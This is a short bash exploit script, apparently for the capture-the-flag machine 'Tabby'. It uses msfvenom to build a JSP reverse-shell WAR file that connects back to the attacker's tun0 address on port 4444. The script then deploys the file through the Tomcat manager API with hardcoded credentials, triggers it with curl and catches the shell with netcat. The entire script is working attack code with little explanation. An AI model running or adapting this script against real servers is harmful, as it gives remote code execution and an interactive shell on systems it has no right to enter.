#Script to exploit local file inclusion on Tabby
#!/bin/bash
	
	#use -n flag to generate a new shell 
	shell_name=uniq_shell.war
	path=esamadre
	ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
	echo $ip4
	if [ "$1" = -n ]; #&& [ $2 != '' ]
	then
		sudo rm -rf $shell_name 
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip4 LPORT=4444 -f war > $shell_name -i 25
		echo 'Reverse shell successfully generated'
	fi
	curl -u 'tomcat':'$3cureP4s5w0rd123!' -T $shell_name 'http://10.10.10.194:8080/manager/text/deploy?path=/'$path
	curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list 
	curl http://10.10.10.194:8080/$path/ &

	echo 'Listening on port 4444'
	nc -nvlp 4444
	
	#python3 -c 'import pty; pty.spawn("/bin/bash")'